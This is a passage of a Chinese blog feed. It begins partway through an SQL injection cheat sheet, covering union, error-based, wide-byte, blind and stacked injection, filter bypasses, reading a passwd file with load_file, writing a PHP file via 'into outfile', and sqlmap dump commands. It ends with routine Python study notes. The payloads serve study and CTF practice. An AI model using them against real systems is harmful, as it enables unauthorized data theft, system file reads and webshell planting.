alt="image-20200203153343749"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(pw) <span class="keyword">from</span> <span class="keyword">test</span>),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/YHkUbrgCh1T43WV.png" alt="image-20200203153455298"></p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>当information_schema库用不了的时候用到sys库和mysql库，但这些库中没提供查询列的表，故就要用到无列名查询，<a href="https://extrader-home.github.io/2020/02/03/SWPU2019-Web1/" target="_blank" rel="noopener">详见</a></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>常见的报错注入函数有floor()，updatexml()，extractvalue()三种方法，另外还有join，pow()等函数，<a href="https://extrader-home.github.io/2020/01/17/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/" target="_blank" rel="noopener">函数用法</a></p><p>floor()：<a href="https://www.cnblogs.com/sfriend/p/11365999.html" target="_blank" rel="noopener">mysql的floor()报错注入方法详细分析</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p>updatexml()（XPATH语法报错）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(1,(<span class="keyword">SELECT</span> <span class="keyword">database</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/lnXtwHOfB7FPmNW.png" alt="image-20200203150137526"></p><p>extractvalue()（XPATH语法报错）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(1,database()));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/SO3vxkUdKtr2NPC.png" alt="image-20200203150114476"></p><p>join（SQL语法报错）： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">test</span> <span class="keyword">as</span> b)c;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/qKwyaRS4DZHuQsV.png" alt="image-20200203150228127"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">test</span> <span class="keyword">as</span> b <span class="keyword">using</span>(<span class="keyword">id</span>))c;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/B56xQidY7kjCqTI.png" alt="image-20200203150244261"></p><p>pow()（函数溢出报错，常配合布尔盲注使用）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">pow</span>(<span class="number">999</span>,<span class="number">999</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/DhFRAfNP5jKEBSQ.png" alt="image-20200203151840615"></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>由编码不统一造成的，这种注入常出现在<code>PHP+MYSQL</code>中，PHP配置文件中存在<code>magic_quotes_gpc</code>选项，被称为魔术引导，使用<code>GET,POST,Cookie</code>所接收的单引号，双引号，反斜杠和NULL字符都会被自动加上一个反斜杠转义</p><p>在测试单引号的时候在前面加上<code>%d5</code>即可测出，若报错，或显示<code>誠’</code>则存在宽字节注入绕过转义后面再接上SQL注入语句</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>查询结果 + 比较运算符 + 猜测值</p><p>利用Burp的Intrude模块或者python脚本进行注入，配合<code>ascii()</code>，<code>substr()</code>等函数简单来讲就是不断尝试判断，逐个字符爆破，<a href="https://extrader-home.github.io/2020/01/21/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DSQL%E9%A2%98/#FinalSQL" target="_blank" rel="noopener">例</a></p><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>load_file()函数读取文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">load_file</span>(<span class="string">'/ets/passwd'</span>),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>单引号被过滤了可以用以下语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">load_file</span>(<span class="number">2</span>f6574732f706173737764),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>into outfile()写文件操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'c:\wwwroot\1.php'</span></span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>后台存在<code>mysqli_multi_query()</code> 函数，用分号分隔多个查询语句，于是可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><p>空格：<code>()</code>、<code>/**/</code>、<code>+</code>、<code>%0a</code>（换行）、<code>%20</code>、<code>%09</code>、<code>%0b</code>（）、<code>%0c</code>、<code>%0d</code>、<code>%a0</code>、<code>tab</code>、<code>/*!*/</code>内敛注释</p><p>字符或字符串被过滤（如select、‘，and等）：双写绕过（seselectlect）、大写绕过（And）、替换（^，可用于报错注入）、char()</p><p>information_schema库过滤：使用sys库（<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">详</a>），mysql库（<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">详</a>，<a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">详</a>）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure><p>注释符号：–+，#，被过滤了需要视情况闭合查询语句</p><p>=：like模糊匹配<code>select &#39;12345&#39; like &#39;12%&#39; =&gt; true</code>、<code>&lt; &gt;</code>、 <code>&lt;&gt;</code>、<code>in</code></p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url </span><br><span class="line">-u –&gt; 指定一个url </span><br><span class="line">sqlmap.py -u url --dbs   //爆库</span><br><span class="line">sqlmap.py -u url -D "数据库"  --tables  //爆表</span><br><span class="line">-D –&gt;指定数据库名</span><br><span class="line">sqlmap.py -u url -T "表名" -D "数据库"  --columns //爆列</span><br><span class="line">-T –&gt;指定表名称</span><br><span class="line">sqlmap.py -u url -T "表名" -D "数据库" -C "列名，逗号分隔" --dump  //爆字段</span><br><span class="line">-T –&gt;指定列名</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r “C:\333.txt” -p '参数' --current-db   //爆库</span><br><span class="line">-r –&gt; 加载一个文件 </span><br><span class="line">-p –&gt;指定参数 </span><br><span class="line">--current-db –&gt;获取当前数据库名称</span><br><span class="line">sqlmap.py -r “C:\333.txt” -p '参数' -D '数据库名' --tables    //爆表</span><br><span class="line">-D –&gt;指定数据库名</span><br><span class="line">--tables –&gt;列出数据库中的表</span><br><span class="line">sqlmap.py -r “C:\333.txt” -p '参数' -D '数据库名' -T '表名' --columns   //爆列</span><br><span class="line">-T –&gt;指定表名</span><br><span class="line">--columns –&gt;列出表中的字段 </span><br><span class="line">sqlmap.py -r “c:\333.txt” -p '参数' -D '数据库名' -T '表名' -C '列名' --dump //爆字段</span><br><span class="line">--dump –&gt;列出字段数据</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2020/02/01/python%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/02/01/python%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h2><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">绝对值函数</td><td align="center">abs(-1) = 1</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">商余函数</td><td align="center">divmod(10,3) = (3,1)</td></tr><tr><td align="center">pow(x,y,z)</td><td align="center">幂运算函数</td><td align="center">pow(2,2) = 4,pow(2,2,3) = 1</td></tr><tr><td align="center">round(x)</td><td align="center">四舍五入函数</td><td align="center">round(1.5) = 2</td></tr><tr><td align="center">max(x)</td><td align="center">最大值函数</td><td align="center">max(1,2,3) = 3</td></tr><tr><td align="center">min(x)</td><td align="center">最小值函数</td><td align="center">min(1,2,3) = 1</td></tr></tbody></table><h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">返回字符串x的长度，len(“壹1,\‘ a”) = 6</td></tr><tr><td align="center">str(x)</td><td align="center">任意类型x所对应的字符串形式,str(‘abc123’)=abc123,与eval()形成对比</td></tr><tr><td align="center">hex(x)或oct(x)</td><td align="center">整数x的十六进制或八进制小写形式的字符串，hex(111)=’0x6f’,oct(111)=’0o157’</td></tr><tr><td align="center">chr(x)</td><td align="center">x为Unicode编码，返回其对应的字符，chr(20197) = ‘以’</td></tr><tr><td align="center">ord(x)</td><td align="center">x为字符，返回其对应的Unicode编码，ord(“以”) = 20197</td></tr></tbody></table><blockquote><p><strong>输入为小数字符串，转换成int型方法：<code>a = int(float(a))</code></strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">print(chr(<span class="number">9800</span> + i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>♈♉♊♋♌♍♎♏♐♑♒♓</p><h2 id="字符串处理方法"><a href="#字符串处理方法" class="headerlink" title="字符串处理方法"></a>字符串处理方法</h2><table><thead><tr><th align="center">方法及使用</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">str.lower()或str.upper()</td><td align="center">返回字符串的副本，全部字符小写/大写 “AbCdEfGh”.lower()结果为“abcdefgh”</td></tr><tr><td align="center">str.split(sep=None)</td><td align="center">返回一个列表，由str根据sep被分隔的部分组成 “A,B,C”.split(“,”)结果为[‘A’,’B’,’C’]</td></tr><tr><td align="center">str.count(sub)</td><td align="center">返回子串sub在str中出现的次数  “a apple a day”.count(“a”)结果为4</td></tr><tr><td align="center">str.replace(old,new)</td><td align="center">返回字符串str副本，所有old子串被替换为new “python”.replace(“n”,”n123”)结果为‘python123’</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">字符串str根据宽度width居中fillchar可选 “python”.center(20,”=”) 结果为‘=======python=======’</td></tr><tr><td align="center">str.strip(chars)</td><td align="center">从str中去掉在其左侧和右侧chars中列出的字符 “= python=”.strip(“ =np”)结果为 ‘ytho’</td></tr><tr><td align="center">str.join(iter)</td><td align="center">在iter变量除最后元素外每个元素后增加一个 str”,”.join(“12345”)结果为’1,2,3,4,5’ 主要用于字符串分隔等</td></tr><tr><td align="center">str.isdigit()</td><td align="center">判断接收的字符是否为数字，返回True或False，无参数</td></tr></tbody></table><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>即程序报错执行except的语句</p><img src="https://i.loli.net/2020/03/27/YVvrZ6iweDx4TXQ.png" alt="image-20200204172105285" style="zoom: 50%;" /><img src="https://i.loli.net/2020/03/27/ElwC1IRJxPyu8g3.png" alt="image-20200204172853121" style="zoom:50%;" /><p>异常类型详见：<a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">Python 异常处理</a></p><h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">randint(a,b)</td><td align="center">生成一个[a,b]之间的整数&gt;&gt;&gt;random.randint(10,100)=64</td></tr><tr><td align="center">randrange(m,n[,k])</td><td align="center">生成一个[m,n)之间以k为步长的随机整数&gt;&gt;&gt;random.randrange(10,100,10)=80</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">生成一个k比特长的随机整数&gt;&gt;&gt;random.getrandbits(16)=37885</td></tr><tr><td align="center">uniform(a,b)</td><td align="center">生成一个[a,b]之间的随机小数&gt;&gt;&gt;random.uniform(10,100)=13.234563456</td></tr><tr><td align="center">choice(seq)</td><td align="center">从序列seq中随机选择一个元素&gt;&gt;&gt;random.choice([1,2,3,4,5,6,7,8,9,0])=5</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">将序列seq中元素随机排序，返回打乱后的序列                             &gt;&gt;&gt;s=[1,2,3,4];random.shuffle(s);print(s)   [3,1,4,2]</td></tr></tbody></table><blockquote><p>global：在函数内部声明全局变量</p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>汉诺塔问题求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanoi</span><span class="params">(n,src,dst,mid)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">"&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;"</span>.format(<span class="number">1</span>,src,dst))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanoi(n<span class="number">-1</span>,src,mid,dst)</span><br><span class="line">        print(<span class="string">"&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;"</span>.format(n,src,dst))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        hanoi(n<span class="number">-1</span>,mid,dst,src)</span><br><span class="line">hanoi(<span class="number">5</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>)</span><br><span class="line">print(count)</span><br></pre></td></tr></table></figure><p>科赫曲线雪花绘制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koch</span><span class="params">(size,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        turtle.fd(size)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> angle <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">60</span>,<span class="number">-120</span>,<span class="number">60</span>]:</span><br><span class="line">            turtle.left(angle)</span><br><span class="line">            koch(size/<span class="number">3</span>,n<span class="number">-1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.goto(<span class="number">-300</span>,<span class="number">100</span>)</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.pensize(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        koch(<span class="number">300</span>,<span class="number">3</span>)  <span class="comment">#2阶科赫曲线，阶数</span></span><br><span class="line">        turtle.right(<span class="number">120</span>)</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h2><table><thead><tr><th align="center">操作函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">如果x不在集合S中，将x增加到S</td></tr><tr><td align="center">S.discard(x)</td><td align="center">移除S中元素x，如果不在集合S中，不报错</td></tr><tr><td align="center">S.remove()</td><td align="center">移除S中元素x，如果x不在集合S中，产生KeyError异常</td></tr><tr><td align="center">S.clear()</td><td align="center">移除S中的所有元素</td></tr><tr><td align="center">S.pop()</td><td align="center">随机<strong>返回</strong>S中的一个元素，<strong>更新</strong>S，若S为空产生KeyError异常</td></tr><tr><td align="center">S.copy()</td><td align="center">返回集合S中的一个副本</td></tr><tr><td align="center">len(S)</td><td align="center">返回集合S的元素个数</td></tr><tr><td align="center">x in S</td><td align="center">判断S中元素x，x在集合S中，返回True，否则返回False</td></tr><tr><td align="center">x not in S</td><td align="center">判断S中元素x，x不在集合S中，返回False，否则返回True</td></tr><tr><td align="center"><code>set(x)</code></td><td align="center">将其他类型变量x转变为<code>集合</code>类型，可用以集合元素去重</td></tr><tr><td align="center"><code>list(x)</code></td><td align="center">转换为<code>列表</code>类型</td></tr><tr><td align="center"><code>tuple(x)</code></td><td align="center">转换为<code>元组</code>类型</td></tr></tbody></table><h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><img src="https://i.loli.net/2020/03/27/z9aKLXk7RInqOgQ.png" alt="image-20200205173145060" style="zoom:50%;" /><table><thead><tr><th align="center">函数和方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(s)</td><td align="center">返回序列s的长度</td></tr><tr><td align="center">min(s)</td><td align="center">返回序列s的最小元素，s中元素需要可比较</td></tr><tr><td align="center">max(s)</td><td align="center">返回序列s的最大元素，s中元素需要可比较</td></tr><tr><td align="center">s.index(x)或s.index(x,i,j)</td><td align="center">返回序列s从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td align="center">s.count(x)</td><td align="center">返回序列s中出现x的总次数</td></tr></tbody></table><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><img src="https://i.loli.net/2020/03/27/5nwmHBujzJ1ThrW.png" alt="image-20200205175031008" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/2yJrOCT9t14ZUEd.png" alt="image-20200205175315482" style="zoom:50%;" /><blockquote><p>sorted()：对列表进行排序（小到大）</p></blockquote><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>使用<code>{}</code>和<code>dict{}</code>给变量赋值创建，键值对之间用<code>:</code>分隔，d[key]可以进行索引也可用于赋值，但在进行赋值的时候只能啊<code>a[1] = a[2]</code>这样赋值，不能<code>1 = a[1]</code>、a[i]代表的是i这个键对应的值，无法直接修改值的键，如果要对键操作需要将这个键删除（即<code>(del a[i])</code>），然后再将这个值赋给一个新的键。</p><p><code>update()</code>方法，在字典中添加键值对，也可以直接赋值添加</p><img src="https://i.loli.net/2020/03/27/BxeCwzGbZEgik6o.png" alt="image-20200216101507795"  /><img src="https://i.loli.net/2020/03/27/zDKjF4QiPG3NtYX.png" alt="image-20200205184557293" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/KvJeRGomAHuBhzY.png" alt="image-20200205184654602" style="zoom:67%;" /><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><img src="https://i.loli.net/2020/03/27/I7piDjwXO4r3x6N.png" alt="image-20200207164533879" style="zoom:50%;" /><p>文件读取方法：<code>read()</code>,<code>readline()</code>,<code>readlines()</code>,在入方法：<code>write()</code>,<code>writelines()</code></p><p>二维数据的处理：<code>for</code>循环+<code>.split()</code>和<code>.join()</code></p><p>三国演义人物出场词频统计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = open(<span class="string">"三国演义.txt"</span>,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>).read()</span><br><span class="line">words = jieba.lcut(txt)  <span class="comment">#lcut精确模式，返回一列表类型</span></span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> len(word) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        counts[word] = counts.get(word,<span class="number">0</span>) + <span class="number">1</span>    <span class="comment">#字典类型中'='为创造一个键值对，亦可进行赋值操作</span></span><br><span class="line">items = list(counts.items()) <span class="comment">#items方法为返回字典中所有的键值对信息</span></span><br><span class="line">items.sort(key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    word,count = items[i]</span><br><span class="line">    print(<span class="string">"&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;"</span>.format(word,count))</span><br></pre></td></tr></table></figure><h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h2><p>生成器<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856/" target="_blank" rel="noopener">参考</a></p><img src="https://i.loli.net/2020/03/27/kt2rKofTIgqmW4s.png" alt="image-20200217193657638" style="zoom:50%;" /><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>评估函数</p><p>用法：去掉参数最外侧引号并执行余下语句的函数</p><p><img src="https://i.loli.net/2020/03/27/yc4dgIQOioKVFzS.png" alt=""></p><h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>格式化函数</p><p>基本语法是通过{}和:来代替以前的%，<a href="https://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">详</a></p><img src="D:\Blog\source\_posts\python笔记.assets\image-20200202141611146.png" alt="image-20200202141611146" style="zoom:67%;" /><img src="https://i.loli.net/2020/03/27/V2CbWG4EguJqZ8T.png" alt="image-20200202171711002" style="zoom:50%;" /><h2 id="type"><a href="#type" class="headerlink" title="type()"></a>type()</h2><img src="https://i.loli.net/2020/03/27/B5IV1WGJcKftpYd.png" alt="image-20200215100705983" style="zoom:67%;" /><h2 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h2><img src="https://i.loli.net/2020/03/27/DUtXoG8bpyCj6Ea.png" alt="image-20200215145928773" style="zoom:67%;" /><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p><a href="https://www.runoob.com/python/file-methods.html" target="_blank" rel="noopener">参考</a></p><img src="https://i.loli.net/2020/03/27/alvI6SjKQYDbXCN.png" alt="image-20200216104144396" style="zoom:67%;" /><h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><img src="https://i.loli.net/2020/03/27/UZYHy7JhXqaSE4I.png" alt="image-20200217165003927" style="zoom:67%;" /><h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><p><a href="https://www.jianshu.com/p/6c33bd958f3d" target="_blank" rel="noopener">参考</a></p><p>mode 参数有：</p><table><thead><tr><th align="center">模式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">t</td><td align="center">文本模式 (默认)。</td></tr><tr><td align="center">x</td><td align="center">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="center">b</td><td align="center">二进制模式。</td></tr><tr><td align="center">+</td><td align="center">打开一个文件进行更新(可读可写)。</td></tr><tr><td align="center">U</td><td align="center">通用换行模式（不推荐）。</td></tr><tr><td align="center">r</td><td align="center">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="center">rb</td><td align="center">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td align="center">r+</td><td align="center">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="center">rb+</td><td align="center">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w</td><td align="center">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb</td><td align="center">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w+</td><td align="center">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb+</td><td align="center">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">a</td><td align="center">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">ab</td><td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">a+</td><td align="center">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="center">ab+</td><td 